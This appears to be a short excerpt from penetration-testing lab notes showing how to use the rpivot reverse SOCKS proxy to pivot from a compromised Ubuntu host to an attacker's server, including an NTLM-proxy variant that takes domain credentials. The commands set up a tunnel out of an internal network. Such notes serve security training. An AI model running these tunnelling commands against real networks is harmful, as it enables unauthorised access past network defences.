[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.

We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.

We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using `server.py`.

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Before running `client.py` we will need to transfer rpivot to the target. We can do this using this SCP command.

```bash
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

On the pivot host we run the client
```bash
 python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```


#### Connecting to a Web Server using HTTP-Proxy & NTLM Auth

```bash
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```